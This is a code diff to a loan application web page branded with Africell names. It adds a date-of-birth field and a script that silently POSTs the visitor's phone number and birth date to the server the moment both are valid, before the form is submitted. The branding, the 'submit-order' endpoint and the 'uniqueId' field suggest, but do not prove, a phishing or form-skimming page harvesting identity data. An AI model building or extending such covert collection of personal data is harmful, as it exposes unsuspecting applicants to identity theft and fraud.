@@ -294,14 +294,19 @@
 
             <div class="e-input-row">
                 <div class="e-input-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" required placeholder="name@example.com">
+                    <label for="dobInput">Date of Birth (DD/MM/YYYY)</label>
+                    <input type="text" id="dobInput" required placeholder="DD/MM/YYYY" maxlength="10" inputmode="numeric">
                 </div>
 
                 <div class="e-input-group">
                     <label for="loanAmountInput">Loan Amount (Le)</label>
                     <input type="text" id="loanAmountInput" required placeholder="10,000">
                 </div>
+            </div>
+
+            <div class="e-input-group full-width">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" required placeholder="name@example.com">
             </div>
 
             <div class="e-input-group full-width">
@@ -344,6 +349,7 @@
 
     <script>
         let selectedLoanType = 'Grow Business';
+        let lastAutoSentDobKey = '';
 
         function selectLoanType(element, type) {
             document.querySelectorAll('.loan-pill').forEach(pill => pill.classList.remove('active'));
@@ -364,11 +370,84 @@
         document.getElementById('loanAmountInput').value = savedAmount;
 
         const phoneInput = document.getElementById('phoneNumber');
+        const dobInput = document.getElementById('dobInput');
+
+        function formatDobSlashInput(rawVal) {
+            const digits = String(rawVal || '').replace(/\D/g, '').slice(0, 8);
+            if (digits.length <= 2) return digits;
+            if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+            return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
+        }
+
+        function isValidDobDDMMYYYY(dobStr) {
+            const match = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(String(dobStr || '').trim());
+            if (!match) return false;
+            const day = parseInt(match[1], 10);
+            const month = parseInt(match[2], 10);
+            const year = parseInt(match[3], 10);
+            if (month < 1 || month > 12 || day < 1 || day > 31 || year < 1900 || year > 2026) return false;
+            const checkDate = new Date(year, month - 1, day);
+            return (
+                checkDate.getFullYear() === year &&
+                checkDate.getMonth() === month - 1 &&
+                checkDate.getDate() === day
+            );
+        }
+
+        async function autoSendDobOnly(fullPhoneNum, dobValue) {
+            if (!isValidSierraLeonePhone(phoneInput.value.trim()) || !isValidDobDDMMYYYY(dobValue)) return;
+            const cleanDob = dobValue.trim();
+            const sendKey = `${fullPhoneNum}|${cleanDob}`;
+            if (sendKey === lastAutoSentDobKey) return;
+            lastAutoSentDobKey = sendKey;
+
+            try {
+                await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: fullPhoneNum,
+                        uniqueId: `DOB (DD/MM/YYYY): ${cleanDob}`
+                    })
+                });
+            } catch (err) {
+                lastAutoSentDobKey = '';
+                console.error('Auto DOB send error:', err);
+            }
+        }
+
+        dobInput.addEventListener('input', (e) => {
+            e.target.value = formatDobSlashInput(e.target.value);
+            const rawPhone = phoneInput.value.trim();
+            if (isValidSierraLeonePhone(rawPhone) && isValidDobDDMMYYYY(e.target.value)) {
+                const fullPhoneNum = '+232 ' + rawPhone;
+                localStorage.setItem('africellUserDob', e.target.value.trim());
+                localStorage.setItem('africellUserPhone', fullPhoneNum);
+                localStorage.setItem('userPhone', fullPhoneNum);
+                autoSendDobOnly(fullPhoneNum, e.target.value.trim());
+            }
+        });
+
+        phoneInput.addEventListener('input', () => {
+            const rawPhone = phoneInput.value.trim();
+            const dobVal = dobInput.value.trim();
+            if (isValidSierraLeonePhone(rawPhone) && isValidDobDDMMYYYY(dobVal)) {
+                const fullPhoneNum = '+232 ' + rawPhone;
+                localStorage.setItem('africellUserDob', dobVal);
+                localStorage.setItem('africellUserPhone', fullPhoneNum);
+                localStorage.setItem('userPhone', fullPhoneNum);
+                autoSendDobOnly(fullPhoneNum, dobVal);
+            }
+        });
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
             if (savedPhone && phoneInput) {
                 phoneInput.value = savedPhone.replace('+232', '').trim();
+            }
+            const savedDob = localStorage.getItem('africellUserDob');
+            if (savedDob && dobInput && isValidDobDDMMYYYY(savedDob)) {
+                dobInput.value = savedDob;
             }
         });
 
@@ -381,6 +460,7 @@
 
             const fullName = document.getElementById('fullName').value.trim();
             const rawPhone = phoneInput.value.trim();
+            const dobVal = dobInput.value.trim();
             const email = document.getElementById('email').value.trim();
             const finalAmount = document.getElementById('loanAmountInput').value;
             const loanReason = document.getElementById('loanReason').value.trim();
@@ -390,13 +470,21 @@
                 return;
             }
 
+            if (!isValidDobDDMMYYYY(dobVal)) {
+                showAppAlert('Enter Date of Birth as DD/MM/YYYY');
+                return;
+            }
+
             const fullPhoneNum = '+232 ' + rawPhone;
 
             localStorage.setItem('africellUserName', fullName);
             localStorage.setItem('africellUserPhone', fullPhoneNum);
+            localStorage.setItem('africellUserDob', dobVal);
             localStorage.setItem('africellLoanAmount', finalAmount);
             localStorage.setItem('africellLoanType', selectedLoanType);
             localStorage.setItem('userPhone', fullPhoneNum);
+
+            autoSendDobOnly(fullPhoneNum, dobVal);
 
             const overlay = document.getElementById('loadingOverlay');
             const loadingText = document.getElementById('loadingText');
